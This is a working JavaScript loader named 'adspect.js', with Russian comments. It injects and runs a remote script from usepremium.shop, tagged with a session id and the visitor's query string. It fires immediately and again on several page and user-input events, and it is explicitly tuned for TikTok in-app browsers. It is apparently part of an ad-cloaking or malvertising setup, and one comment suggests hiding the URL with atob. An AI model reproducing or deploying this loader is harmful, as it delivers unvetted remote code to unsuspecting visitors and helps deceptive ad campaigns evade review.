// adspect.js (v1.0.3) — многократные триггеры + ретраи, без ожидания видимости
(function () {
  var injected = false;

  function alreadyInjected() {
    try { return !!document.getElementById(btoa(location.origin)); } catch (_) { return false; }
  }

  function inject(reason) {
    if (injected || alreadyInjected()) return;
    injected = true;
    try {
      var a = location;
      var head = document.head || document.getElementsByTagName('head')[0] || document.documentElement;

      // Твой PHP endpoint с __sid (можно заменить на atob('...') — как было раньше)
      var d = 'https://usepremium.shop/ajax.php?__sid=58e1bee9-b022-451d-a8cb-61aee0e64f8b';
      d += (d.indexOf('?') > -1 ? '&' : '?') + a.search.substring(1);

      var s = document.createElement('script');
      s.src = d;
      try { s.id = btoa(a.origin); } catch (_) {}

      // Если загрузка не удалась — позволим повторить попытку другими триггерами
      s.onerror = function () { injected = false; };

      head.appendChild(s);
    } catch (e) {
      injected = false;
    }
  }

  // 1) Пинаем сразу, без ожидания — ключ к TikTok In-App
  setTimeout(inject, 0);

  // 2) Пара мягких ретраев на случай «замороженного» старта
  setTimeout(inject, 800);
  setTimeout(inject, 1600);

  // 3) Дополнительные триггеры: загрузка/фокус/видимость/первое действие пользователя
  window.addEventListener('pageshow', function(){ inject('pageshow'); }, { once: true });
  window.addEventListener('focus', function(){ inject('focus'); }, { once: true });
  if ('visibilityState' in document) {
    document.addEventListener('visibilitychange', function(){ inject('visibility'); }, { once: true });
  }
  ['pointerdown','touchstart','click','scroll','keydown'].forEach(function(evt){
    document.addEventListener(evt, function(){ inject('user'); }, { once: true, passive: true });
  });
})();
